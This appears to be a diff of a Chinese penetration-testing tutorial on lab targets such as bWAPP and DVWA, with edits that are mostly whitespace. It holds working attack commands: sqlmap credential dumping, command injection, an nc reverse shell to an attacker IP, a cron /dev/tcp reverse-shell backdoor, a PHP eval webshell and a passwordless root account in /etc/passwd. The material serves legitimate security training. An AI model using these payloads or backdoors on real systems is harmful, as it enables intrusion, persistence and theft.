@@ -2,15 +2,15 @@
 
 ## 目录
 - [[#一、完整渗透测试方法论|一、完整渗透测试方法论]]
-  - [[#1.1 PTES标准框架|1.1 PTES标准框架]]
-  - [[#1.2 攻击路径规划|1.2 攻击路径规划]]
+ - [[#1.1 PTES标准框架|1.1 PTES标准框架]]
+ - [[#1.2 攻击路径规划|1.2 攻击路径规划]]
 - [[#二、实战环境搭建|二、实战环境搭建]]
 - [[#三、综合实战：完整渗透流程|三、综合实战：完整渗透流程]]
-  - [[#3.1 阶段一：信息收集|3.1 阶段一：信息收集]]
-  - [[#3.2 阶段二：漏洞分析|3.2 阶段二：漏洞分析]]
-  - [[#3.3 阶段三：漏洞利用|3.3 阶段三：漏洞利用]]
-  - [[#3.4 阶段四：后渗透|3.4 阶段四：后渗透]]
-  - [[#3.5 阶段五：渗透测试报告|3.5 阶段五：渗透测试报告]]
+ - [[#3.1 阶段一：信息收集|3.1 阶段一：信息收集]]
+ - [[#3.2 阶段二：漏洞分析|3.2 阶段二：漏洞分析]]
+ - [[#3.3 阶段三：漏洞利用|3.3 阶段三：漏洞利用]]
+ - [[#3.4 阶段四：后渗透|3.4 阶段四：后渗透]]
+ - [[#3.5 阶段五：渗透测试报告|3.5 阶段五：渗透测试报告]]
 - [[#四、手工测试与自动化配合|四、手工测试与自动化配合]]
 - [[#五、综合工具链速查|五、综合工具链速查]]
 
@@ -24,34 +24,34 @@
 
 ```mermaid
 flowchart TD
-    P0[阶段0: 前期准备] --> P0A[签署授权书/NDA]
-    P0A --> P0B[明确测试范围]
-    P0B --> P0C[确定时间窗口]
+ P0[阶段0: 前期准备] --> P0A[签署授权书/NDA]
+ P0A --> P0B[明确测试范围]
+ P0B --> P0C[确定时间窗口]
 
-    P1[阶段1: 信息收集] --> P1A[whatweb/wpscan/joomscan]
-    P1A --> P1B[dirb/gobuster爆破]
-    P1B --> P1C[攻击面分析报告]
+ P1[阶段1: 信息收集] --> P1A[whatweb/wpscan/joomscan]
+ P1A --> P1B[dirb/gobuster爆破]
+ P1B --> P1C[攻击面分析报告]
 
-    P2[阶段2: 威胁建模] --> P2A[分析可利用漏洞]
-    P2A --> P2B[攻击路径优先级排序]
+ P2[阶段2: 威胁建模] --> P2A[分析可利用漏洞]
+ P2A --> P2B[攻击路径优先级排序]
 
-    P3[阶段3: 漏洞分析] --> P3A[nikto/ZAP被动/Nuclei]
-    P3A --> P3B[手工验证关键漏洞]
-    P3B --> P3C[确认漏洞列表]
+ P3[阶段3: 漏洞分析] --> P3A[nikto/ZAP被动/Nuclei]
+ P3A --> P3B[手工验证关键漏洞]
+ P3B --> P3C[确认漏洞列表]
 
-    P4[阶段4: 漏洞利用] --> P4A[sqlmap/commix/beef]
-    P4A --> P4B[Burp手工利用]
-    P4B --> P4C[获取初始访问权限]
+ P4[阶段4: 漏洞利用] --> P4A[sqlmap/commix/beef]
+ P4A --> P4B[Burp手工利用]
+ P4B --> P4C[获取初始访问权限]
 
-    P5[阶段5: 后渗透] --> P5A[权限提升]
-    P5A --> P5B[内网横向移动]
-    P5B --> P5C[数据提取]
+ P5[阶段5: 后渗透] --> P5A[权限提升]
+ P5A --> P5B[内网横向移动]
+ P5B --> P5C[数据提取]
 
-    P6[阶段6: 报告] --> P6A[执行摘要]
-    P6A --> P6B[详细发现]
-    P6B --> P6C[修复建议]
+ P6[阶段6: 报告] --> P6A[执行摘要]
+ P6A --> P6B[详细发现]
+ P6B --> P6C[修复建议]
 
-    P0 --> P1 --> P2 --> P3 --> P4 --> P5 --> P6
+ P0 --> P1 --> P2 --> P3 --> P4 --> P5 --> P6
 ```
 
 ### 1.2 攻击路径规划
@@ -60,12 +60,12 @@ flowchart TD
 
 ```mermaid
 flowchart LR
-    R[信息收集] --> A[路径A: SQL注入 → 凭据 → 登录后台 → WebShell]
-    R --> B[路径B: 弱口令 → 登录后台 → 功能利用 → RCE]
-    R --> C[路径C: XSS → Cookie窃取 → 会话劫持 → 越权]
-    R --> D[路径D: LFI → 日志注入 → RCE → 反弹Shell]
-    R --> E[路径E: 文件上传 → WebShell → 反弹Shell]
-    R --> F[路径F: 命令注入 → 反弹Shell → 内网横向]
+ R[信息收集] --> A[路径A: SQL注入 → 凭据 → 登录后台 → WebShell]
+ R --> B[路径B: 弱口令 → 登录后台 → 功能利用 → RCE]
+ R --> C[路径C: XSS → Cookie窃取 → 会话劫持 → 越权]
+ R --> D[路径D: LFI → 日志注入 → RCE → 反弹Shell]
+ R --> E[路径E: 文件上传 → WebShell → 反弹Shell]
+ R --> F[路径F: 命令注入 → 反弹Shell → 内网横向]
 ```
 
 选择最优路径原则：成功率高、隐蔽性好、最短路径、影响最小。
@@ -88,11 +88,11 @@ flowchart LR
 
 ```mermaid
 flowchart TD
-    ATK[攻击机 ArchStrike<br/>IP: 192.168.1.100] -->|渗透测试| NET[内网交换机]
-    NET --> DVWA[DVWA靶机<br/>:80]
-    NET --> BWAPP[bWAPP靶机<br/>:8080]
-    NET --> MS2[Metasploitable2<br/>多种服务]
-    NET --> WG[WebGoat<br/>:8080]
+ ATK[攻击机 ArchStrike<br/>IP: 192.168.1.100] -->|渗透测试| NET[内网交换机]
+ NET --> DVWA[DVWA靶机<br/>:80]
+ NET --> BWAPP[bWAPP靶机<br/>:8080]
+ NET --> MS2[Metasploitable2<br/>多种服务]
+ NET --> WG[WebGoat<br/>:8080]
 ```
 
 ---
@@ -116,8 +116,8 @@ dirb http://bwapp.local /usr/share/dirb/wordlists/common.txt
 
 # Step 4: gobuster补充爆破
 gobuster dir -u http://bwapp.local \
-         -w /usr/share/wordlists/dirb/big.txt \
-         -x php,txt,bak,old -t 50
+ -w /usr/share/wordlists/dirb/big.txt \
+ -x php,txt,bak,old -t 50
 
 # Step 5: nikto漏洞扫描
 nikto -h http://bwapp.local -o nikto_bwapp.html -Format html
@@ -168,7 +168,7 @@ curl -I http://bwapp.local/adminer.php
 **路径1: SQL注入**
 ```bash
 sqlmap -u "http://bwapp.local/sqli_1.php?title=1&action=search" \
-       --cookie="PHPSESSID=xxx; security_level=0" --dbs
+ --cookie="PHPSESSID=xxx; security_level=0" --dbs
 
 sqlmap -u "URL" --cookie="..." -D bWAPP --tables
 sqlmap -u "URL" --cookie="..." -D bWAPP -T users -C login,password --dump
@@ -180,8 +180,8 @@ sqlmap -u "URL" --cookie="..." -D bWAPP -T users -C login,password --dump
 # 确认: 127.0.0.1;whoami → www-data
 
 commix --url="http://bwapp.local/commandi.php" \
-       --data="target=127.0.0.1&form=submit" \
-       --cookie="PHPSESSID=xxx; security_level=0"
+ --data="target=127.0.0.1&form=submit" \
+ --cookie="PHPSESSID=xxx; security_level=0"
 # 选择 Y 获取伪终端
 
 # 获取反向Shell
@@ -211,16 +211,16 @@ curl "http://bwapp.local/images/shell.php?cmd=nc%20-e%20/bin/sh%20192.168.1.100%
 
 **Step 1: 信息收集（权限内）**
 ```bash
-whoami                    # 确认当前用户
-id                        # 查看UID和组
-uname -a                  # 系统信息
-cat /etc/os-release       # 发行版信息
-hostname                  # 主机名
-ip addr                   # 网络配置
-ss -tlnp                  # 监听端口
-ps aux                    # 进程列表
-crontab -l                # 计划任务
-cat /etc/passwd           # 本地用户列表
+whoami # 确认当前用户
+id # 查看UID和组
+uname -a # 系统信息
+cat /etc/os-release # 发行版信息
+hostname # 主机名
+ip addr # 网络配置
+ss -tlnp # 监听端口
+ps aux # 进程列表
+crontab -l # 计划任务
+cat /etc/passwd # 本地用户列表
 ```
 
 **Step 2: 查找敏感文件**
@@ -263,7 +263,7 @@ chmod 600 /home/user/.ssh/authorized_keys
 
 # Cron后门
 echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/5555 0>&1'" \
-  >> /etc/crontab
+ >> /etc/crontab
 
 # PHP WebShell
 echo '<?php @eval($_POST["x"]); ?>' > /var/www/html/.hidden.php
@@ -276,12 +276,12 @@ echo "backdoor::0:0:root:/root:/bin/bash" >> /etc/passwd
 ```bash
 # 探测内网主机
 for i in $(seq 1 254); do
-  ping -c 1 -W 1 192.168.1.$i | grep "ttl" &
+ ping -c 1 -W 1 192.168.1.$i | grep "ttl" &
 done
 
 # 端口扫描（bash）
 for port in 22 80 443 445 3306 3389 8080; do
-  (echo >/dev/tcp/192.168.1.x/$port) 2>/dev/null && echo "$port open"
+ (echo >/dev/tcp/192.168.1.x/$port) 2>/dev/null && echo "$port open"
 done
 
 # SSH隧道（内网穿透）
@@ -289,7 +289,7 @@ ssh -D 9050 user@target
 # → 配置proxychains进行内网穿透
 
 # 凭证复用
-cat /var/www/html/config.php  # → 数据库密码
+cat /var/www/html/config.php # → 数据库密码
 # → 尝试连接内网MySQL/PostgreSQL
 ```
 
